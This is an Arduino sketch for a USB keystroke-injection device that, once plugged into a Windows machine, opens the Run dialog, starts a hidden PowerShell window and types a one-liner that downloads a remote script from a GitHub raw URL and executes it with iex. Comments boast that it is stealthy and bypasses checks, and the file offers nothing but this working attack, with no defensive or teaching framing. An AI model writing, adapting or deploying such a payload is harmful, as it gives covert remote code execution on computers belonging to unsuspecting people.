#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(500);
  
  // Open Run dialog (Win+R) - Fast and stealthy
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(300);
  
  // Type powershell hidden command
  Keyboard.print("powershell -w hidden");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);

  // Short command - bypass and execute directly
  typeString("iex(iwr -useb 'https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/repo.ps1')");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  
  Keyboard.end();
}

// Fast typing with minimal delay
void typeString(const char* str) {
  while (*str) {
    Keyboard.write(*str);
    delay(5);  // Faster typing
    str++;
  }
}

void loop() {
  // Nothing to do here
}